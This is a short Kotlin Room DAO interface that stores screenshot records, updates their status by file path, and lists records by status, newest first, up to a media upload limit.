package com.android.services.db.dao

import androidx.room.Dao
import androidx.room.Insert
import androidx.room.OnConflictStrategy
import androidx.room.Query
import com.android.services.db.entities.ScreenShot
import com.android.services.util.AppConstants

@Dao
interface ScreenShotDao {

    @Insert(onConflict = OnConflictStrategy.IGNORE)
    fun insert(screenShot: ScreenShot)

    @Query("Update screen_shot set status = :status where file_path = :file")
    fun update(file: String, status: Int): Int

    @Query("Select * from screen_shot where status = :status order by date DESC limit ${AppConstants.mediaFilesUploadLimit}")
    fun selectAllScreenShots(status: Int): List<ScreenShot>
}